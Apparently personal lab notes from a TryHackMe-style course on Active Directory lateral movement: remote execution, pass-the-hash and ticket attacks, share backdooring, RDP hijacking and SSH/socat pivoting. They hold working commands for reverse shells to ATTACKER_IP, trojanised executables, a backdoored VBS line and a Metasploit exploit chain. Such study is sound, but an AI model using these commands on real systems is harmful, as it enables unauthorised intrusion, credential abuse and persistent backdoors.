Having gained [[Breaching AD|access]] and [[Enumerating AD|enumerated]] the AD environment, our next task is to use different techniques to move around the network so we can get a better position to achieve our goals. Doing this is essential for many reasons, some of them being, bypassing network restrictions in place, establishing additional points of entry, creating confusion and avoid detection.

# Spawning Processes Remotely
Here we will look at a few methods we have to spawn a process remotely, allowing us to run commands on machines where we have a valid pair of credentials. Each of these techniques uses a different way to achieve the same purpose, and some of them might be a better fit for some escenarios.

## [[Psexec]]
- **Ports:** 445/TCP ([[Network Services Vulnerabilities#SMB|SMB]])
- **Required Group Memberships:** Administrators

 Psexec has been the default method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where we have access. It is one of many Sysinternals tools that can be downloaded.
 It works as follows:
1. We connect to Admin$ share and upload a service binary. Psexec uses `psexesvc.exe` as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`
3. Create some named pipes to handle stdin/stdout/stderr.
![[Pasted image 20241027201235.png]]
To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run.
```cmd
psexec64.exe \\TargetIP -u Administrator -p Password123 -i cmd.exe
```

## Remote Process Creation Using WinRM
- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

Windows Remote Management ([[WinRM]]) is a web-based protocol used to send powershell command to windows hosts remotely. Most windows server installations will have WinRM enabled by default, making it an attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command.
```cmd
winrs.exe -u:Administrator -p:Password123 -r:target cmd
```
We can achieve the same from powershell, but to pass different credentials, we will need to create a `PSCredential` object
```powershell
$username = 'Administrator';
$password = 'Password123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
Once we have our `PSCredential` object, we can create an interactive session using the Enter-PSSession cmdlet:
```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```
Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a `PSCredential` object as well
```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

## Remotely Creating Services Using `sc`
- **Ports:** 
	- 135/TCP, 49152-65535/TCP (DCE/RPC)
	- 445/TCP (RPC over SMB Named Pipes)
	- 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create a service on a remote host with `sc.exe`, a standard tool available in Windows. When using `sc`, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways.
1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
![[Pasted image 20241027203545.png]]
2. If the latter connection fails, `sc` will try to reach SVCCTL through SMB named pipes, either on port 445 ([[Network Services Vulnerabilities#SMB|SMB]])or 139 (SMB over NetBIOS)
![[Pasted image 20241027203807.png]]
--- 

We can create and start a service using the following:
```cmd
sc.exe \\TARGET create ServiceName binPath= "net user UserName Password123 /add" start= auto
sc.exe \\TARGET start ServiceName
```
The `net user` command will be executed when the service is started, creating a new local user on the system. Since the Operating system is in charge of starting the service, we won't get the command output.
We can use the following to stop and delete the service:
```cmd
sc.exe \\TARGET stop ServiceName
sc.exe \\TARGET delete ServiceName
```

---

Note, that service executables work differently from standard .exe files, and they get killed almost immediately after executing by the service manager, so doing using a normal reverse shell and such will not work. Now, we can circumvent this by encapsulating a payload inside a fully functional service executable, preventing it from being killed. [[Metasploit|msfvenom]] supports this format `exe-service`
```shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```


## Creating Scheduled Tasks Remotely
Similar to Cronjobs. We can create scheduled tasks and run one remotely with `schtasks`, available in any Windows installation. 
```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "TaskName1" /tr "<command 2 execute>" /sc ONCE /sd 01/01/1970 /st 00:00

schtasks /s TARGET /run /tn "TaskName1"
```
So, we are telling it to set the scheduled type (`/sc`) to ONCE, which means the task will only be ran at the specified time and date. Since we will be running the task manually, the starting date (`/sd`) and starting time (`/st`) won't matter much.
Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.
Finally to delete the scheduled task, we can use the following:
```cmd
schtasks /s TARGET /tn "TaskName1" /delete /f
```


# Moving Laterally Using WMI
We can also perform many techniques discussed before, by using Windows Management Instrumentation (WMI). WMI is Windows implementation of Web-Based Enterprise Management (WEBM), an enterprise standard for accessing management information across devices.
In simpler terms, WMI allows administrators to perform standard management tasks that we can abuse to perform lateral movement in various ways.

## Connecting to WMI from Powershell
Before being able to connect to WMI using powershell commands, we need to create a `PSCredential` object with our user and password. We will be using this object for the rest of the methods for WMI
```powershell
$username = 'Administrator';
$password = 'Password123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
We then proceed to establish a WMI sessions using either of the following protocols:
- **DCOM:** 135/TCP, 49152-65535/TCP (RPC over IP)
- **Wsman:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
To establish a WMI session from powershell, we can use the following commands and store the session on the `$Session` variable, which we will use latter for different techniques:
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. the options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

## Remote Process Creation Using WMI
- **Ports:** 
	- 135/TCP, 49152-65535/TCP (DCE/RPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators
We can remotely spawn a process from Powershell by leveraging WMI, sending a WMI request to the `Win32_Process` class to spawn the process under the session we created before:
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value Iwashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```
Notice that WMI won't allow us to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be donde using wmic from the command prompt:
```cmd
wmic.exe /user:Administrator /password:Password123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

## Creating Services Remotely with WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

To create services with WMI through powershell, we can use the following:
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "ServiceName1";
DisplayName = "ServiceName1";
PathName = "net user UserName Pass123 /add";
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
And then, we can get a handle on the service and start it with the following commands:
```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'ServiceName1'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```
Finally, we clean with the following:
```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```


## Creating Scheduled Tasks Remotely with WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

To create scheduled tasks we can use some cmdlets available in Windows default installations:
```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user UserName Pass123 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "TaskName1"
Start-ScheduledTask -CimSession $Session -TaskName "TaskName1"
```
To clean up we use:
```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "TaskName1"
```


## Installing MSI packages through WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI, a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. 
We can create our MSI payload with msfvenom
```sh
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=4444 -f msi > myinstaller.msi
```

Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:\
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
PackageLocation = "C:\Windows\myinstaller.msi"; 
Options = ""; 
AllUsers = $false
}
```

We can also use the following for legacy systems:
```cmd
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```


# Use of Alternate Authentication Material
By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.
## [[Active Directory#NetNTLM|NTLM]] Authentication
As mentioned briefly in [[Breaching AD#NTLM Authenticated Services|here]], NTLM authenticates users based on a challenge-response based system. It works by doing the following
![[Pasted image 20241028231708.png]]
1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends back the response to the server for verification
4. The server forwards both the challenge and sends it back to the server for verification
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated, otherwise, access is denied. The authentication is sent back to the server.
6. The server forwards the authentication result to the client.
Note, that this process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.

## Pass-the-Hash
As a result of extracting credentials from a host where we have attained administrative privileges (by using [[Mimikatz]], or similar tools), we might get clear-text passwords or hashes that can be easily cracked. However, if we aren't lucky enough, we will end up with non-cracked NTLM password hashes.
Now, even though we cannot use the original password for authentication, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain **is configured to use NTLM authentication**, we can **Pass-the-Hash** (PtH) and authenticate successfully.

---


Be it that we got the hashes from [[Mimikatz#Extracting NTLM hashes from local SAM|local SAM]] or [[Mimikatz#Extracting NTLM hashes from LSASS memory|LSASS memory]], we can now use the extracted hashes to perform a PtH attack by using Mimikatz to inject an access token for the victim user on a reverse shell (or any other command)
```mimikatz
token::revert
sekurlsa::pth /user:john.smith /domain:DOMAIN /ntlm:6a6a6a6a6a6a6a6a /run:"c:\tools\nc64.exe -e cmd.exe IP 1337"
```
Here, we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.
The rest would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can gain further control.
Also, similar to the `runas` command, if we run a command like `whoami` it will still list us as the user, but any command we run will actually use the credentials we injected.

---


Now, if we have access to a linux machine, several tool have built-in support to perform a PtH using different protocols. Depending on which services are available to us, we can do the following:
### Connect to [[RDP]]
```sh
xfreerdp /v:TARGET_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```
### Connect via psexec
```sh
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@TARGET_IP
```
Note, that only the linux version of psexec supports PtH
### Connect to [[Evil-WinRM|WinRM]]
```sh
evil-winrm -i TARGET_IP -u MyUser -H NTLM_HASH
```

## [[Active Directory#Kerberos|Kerberos]] Authentication
The other method of authentication for Windows networks is Kerberos, it works by doing the following:
1. 
The user sends his username and a timestamp encrypted using a key derived from his password to the **Key Distribution Center** (KDC), a service usually installed on the DC in charge of creating Kerberos tickets on the network.
The KDC will then create and send back a **Ticket Granting Ticket** (TGT), allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.
Note that the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is **important** to know that the encrypted TGT includes a copy of the Session key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
![[Pasted image 20241029115017.png]]
2. 
When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service** (TGS). TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name** (SPN), which indicates the service and server name they intend to access.
As a result, the KDC will send us the TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
![[Pasted image 20241029115546.png]]
3. 
The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.
![[Pasted image 20241029120203.png]]


## Pass-the-Ticket
Sometimes it is possible to extract [[Mimikatz#Extracting Kerberos tickets and Session Keys from LSASS memory|Kerberos tickets and Session Keys]] from LSASS memory using mimikatz. 
While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access. At the same time, TGSs are only good for a specific service. Extracting **TGT**s will require us to have **administrator**'s credentials, and extracting **TGS**s can be done with a **low-privileged** account (only the ones assigned to that account).

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following
```mimikatz
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.DOMAIN.COM.kirbi
```
Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, we can use the `klist` command on cmd or `kerberos::list` inside mimikatz.

## Overpass-the-hash / Pass-the-Key
This kind of attack is similar to PtH but applied to Kerberos networks.
When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (Disabled by default on current Windows versions), RC4, AES128, AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-Key** (PtK).
Depending on the available [[Mimikatz#Extracting Kerberos Encryption keys from LSASS memory|Kerberos encryption keys]], we can run the following commands on mimikatz to get a reverse shell via PtK
### If we have the RC4 hash
```mimikatz
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
```
Note that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is known as **Overpass-the-Hash** (OPtH)

### If we have the AES128 hash
```mimikatz
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
```

### If we have the AES256 hash
```mimikatz
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
```


# Abusing User Behavior
Under certain circumstances, an attacker can take advantage of actions performed by users to gain further access to machines in the network. While there are a fuck ton of ways this can happen, we will list some of the most common ones

## Abusing Writable Shares
When checking corporate environments it is quite common to find network shares that legitimate users use to perform day-to-day tasks. If those shares are writable for some reason, we can plant specific files to force users into executing any arbitrary payload and gain access to their machines.
A common scenario consists of finding a shortcut to a script or executable file hosted on a network share.
![[Pasted image 20241102133835.png]]
The reason behind this, is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user's machine. If we have permissions over such scripts or executables, we can backdoor them to force users to execute any payload we want.
Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged account)

### Backdooring .vbs Scripts
For example if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:
```cmd
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1337", 0, True
```
This will copy nc64.exe form the share to the user's workstation `%temp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

### Backdooring .exe Files
If the shared file is a Windows binary, ex putty.exe, we can download it from the share and use msfvenom to [[Injection types|Inject]] a [[Persistence#Backdooring Files|backdoor]] into it. The binary will still work as usual but execute an additional payload silently.
```sh
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=tun0 lport=4444 -b "\x00" -f exe -o puttyX.exe
```
The resulting puttyX.exe create a reverse shell connection, without any indication of something happening. Once the file is generated, we can replace the executable on the windows share and wait for any connections.

## RDP hijacking
When an administrator users Remote Desktop to connect to a machine and closes the RDP client instead of logging off, hist session will remain open on the server indefinitely. If we have SYSTEM privileges on Windows Server 2016 and earlier, we can take over any existing RDP session without requiring a password.
To do this, we first run cmd as administrator, then use psexec
```cmd
psexec64.exe -s cmd.exe
```
To list existing sessions on a server, we use
```cmd
query user
```
According to the output, we can know which sessions have been left open and which are currently active. Any session with **Disc** state has been left open by the user and isn't being used at the moment. While we can take over active sessions as well, the legitimate user will be forced out of his session when we do so. 
To connect, we can use `tscon.exe` and specify the session **ID** we will be taking over, as well as our current **SESSIONNAME**.
```cmd
tscon.exe 14 /dest:rdp-tcp#99
```
Essentially, it states that the graphical session 14, owned by our afk target, should be connected with the RDP session `rdp-tcp#99`, owned by us.
As a result we will resume from the target's RDP session and connect to it immediately.
Note that Windows Server 2019 won't allow us to connect to another user's session without knowing its password.


# Port Forwarding
Most of the lateral movement techniques we have covered require specific ports to be available for an attacker. In real-world networks, the administrator may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing us from reaching SMB, RDP, WinRM or RCP ports.
To go around these restrictions, we can use port forwarding techniques, which consist of using any compromised host as a jump box to pivot to the other hosts. It is expected that some machines will have more network permissions than others, as every role in a business will have different needs in terms of what network services are required for day-to-day work.

## SSH Tunnelling
One of the most used protocols, SSH, it already has built-in functionality to do port forwarding through a feature called [[C2#SSH Port-forwarding|SSH Tunnelling]]. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so we can expect to find it in many systems nowadays, no matter the OS.

Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (no admin needed) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. 
We will start a tunnel from the PC-1 machine, acting as an SSH client, to our machine, which will act as an SSH server. This is because we'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.
![[Pasted image 20241102142132.png]]
Since we'll be making a connection back to our machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:
```sh
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
Depending on our needs, the SSH tunnel can be used to do either local or remote port forwarding.

### SSH Remote Port Forwarding
In our example, lets assume that firewall policies block our machine from directly accessing port 3389 on the server. In this case we can use PC-1 which we have compromised to pivot to port 3389 using remote port forwarding, as this allows us to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (our machine).
As a result, a port will be opened in our machine that can be used to connect back to port 339 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1
![[Pasted image 20241102142901.png]]
In this case, to forward port 3389 on the server back to our machine, we can run on PC-1
```cmd
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```
Establishing an SSH session from PC-1 to `1.1.1.1` (our machine) using the `tunneluser` user.
Since the `tunneluser` isn't allows to run a shell on our machine, we need to run the ssh command with the `-N` flag to prevent the client from requesting one, or the connection will exit immediately. The `-R` flag is used to request a remote port forward, and the syntax requires us to first indicate the port we will be opening at the SSH server (our machine), followed by a colon and then the IP and port of the socker we'll be forwarding (`3.3.3.3:3389`). The ports don't need to match, but they can if you want to.

### SSH Local Port Forwarding
Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our case, this could be used to take any service available in our machine ad make it available through a port on PC-1. That way, any host that can't connect directly to our machine but can connect to PC-1 will now be able to reach our machine's services through the pivot host.
Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.
![[Pasted image 20241102145250.png]]
To forward port 80 from our machine and make it available from PC-1 we can run the following on PC-1
```cmd
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```
Similar to the Remote Forwarding, but we now use the `-L` flag for local port forwarding. It requires us to indicate the local socket used by PC-1 to receive connections (`*:80`) and the remote socket to connect to from our machine's perspective (`127.0.0.1:80`)
Note that we use the local host IP address in the second socket, as from our machine's perspective, that's the host that holds the port 80 to be forwarded.
Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). Admin privileges required
```cmd
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
Once our tunnel is set up, any user pointing their browsers to PC-1 at `http://2.2.2.2:80` will see the website published by us.

## Port Forwarding With socat
In situation where SSH is not available, socat can be used to perform similar functionality. While not as flexible, socat allows us to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.
The basic syntax to perform port forwarding is as follows. If we wanted to open port 3389 on a host and forward any connection we receive there to port 3389 on host 3.3.3.3, we can use the following:
```cmd
socat TCP4-LISTEN:1234,fork TCP4:3.3.3.3:4321
```
The `fork` option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing. If we don't include it, socat will close when the first connection made is finished.
Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to
![[Pasted image 20241102150542.png]]
Similar to before, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port.
Also, if we wanted, to expose port 80 from our machine, so that it is reachable by the server, we just need to tweak the IP
```cmd
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```
As a result, PC-1 will spawn port 80 and listen for connections to be forwarded to port 80 on our machine.
![[Pasted image 20241102150827.png]]



## Dynamic Port Forwarding and SOCKS
While single port forwarding works well for tasks that require access to specific sockets, there are times when we might need to run [[Nmap|scans]] against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, **dynamic port forwarding** allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a **SOCKS proxy**.
Since we don't want to rely on an SSH server existing on the windows machine in our network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following.
```cmd
ssh tunneluser@1.1.1.1 -r 9050 -N
```
In this case, the SSH server will start a SOCKS proxy on port `9050`, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

This allows us to use any of our tools through the SOCKS proxy by using **proxychains**. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains4.conf` on Kali. If we scroll down to the end we should see a line that indicates the port in use for socks proxying
```
[ProxyList]
socks4 127.0.0.1 9050
```
The default port is 9050, but any port will work as long as it matches the one used when establishing the SSH tunnel.
If we now want to execute any command through the proxy, we can use proxychains:
```sh
proxychains curl http://pxeboot.za.domain.com
```
Note that some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so the efficiency of this method may vary.


## Tunnelling Complex Exploits
For some exploits we often are going to need several things, being able to reach a vulnerable port, making a machine create a connection to us through a http server, or something else, but if the firewalls rules are sturdy enough to not allow any outbound connection to machines outside the AD or on the local network, then we will be running into problems. This is where port forwarding can help us.
As an example we are going to check an exploit that works by, first, triggering an exploit in a vulnerable port, second, request a payload via an http server hosted by us, and finally, sending a reverse shell to us. 
![[Pasted image 20241104112244.png]]
With this in mind, we have 3 ports that we need to forward, we could use SSH to forward these from our machine to our pivot machine and then to our target. Keeping in mind that both the second and third step require the target reaching to us, and the first us reaching the target, we can continue.
![[Pasted image 20241104112518.png]]
Assuming that the vulnerable port is `80`, the port for the server is `4444` and the reverse port is `1337`, we can use the following command
```cmd
ssh tunneluser@Attacker_PC -R 80:dc.za.domain.com:80 -L *:4444:127.0.0.1:4444 -L *:1337:127.0.0.1:1337 -N
```

Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:
```sh
user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 1337 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 4444
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 80
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

There is a lot to unpack here:

- The **LHOST** parameter usually serves two purposes: it is used as the IP where a listener is bound on the attacker's machine to receive a reverse shell; it is also embedded on the payload so that the victim knows where to connect back when the exploit is triggered. In our specific scenario, since THMDC won't be able to reach us, we need to force the payload to connect back to THMJMP2, but we need the listener to bind to the attacker's machine on `127.0.0.1`. To this end, Metasploit provides an optional parameter `ReverseListenerBindAddress`, which can be used to specify the listener's bind address on the attacker's machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to 127.0.0.1 on the attacker's machine and the payload to connect back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).
- Our exploit must also run a web server to host and send the final payload back to the victim server. We use **SRVHOST** to indicate the listening address, which in this case is 127.0.0.1, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker's machine.  
- The **RHOSTS** is set to point to 127.0.0.1 as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC.


# Resources
Should we be interested in more tools and techniques, the following resources are available:

- [Sshuttle](https://github.com/sshuttle/sshuttle)
- [Rpivot](https://github.com/klsecservices/rpivot)
- [Chisel](https://github.com/jpillora/chisel)
- [Hijacking Sockets with Shadowmove](https://adepts.of0x.cc/shadowmove-hijack-socket/)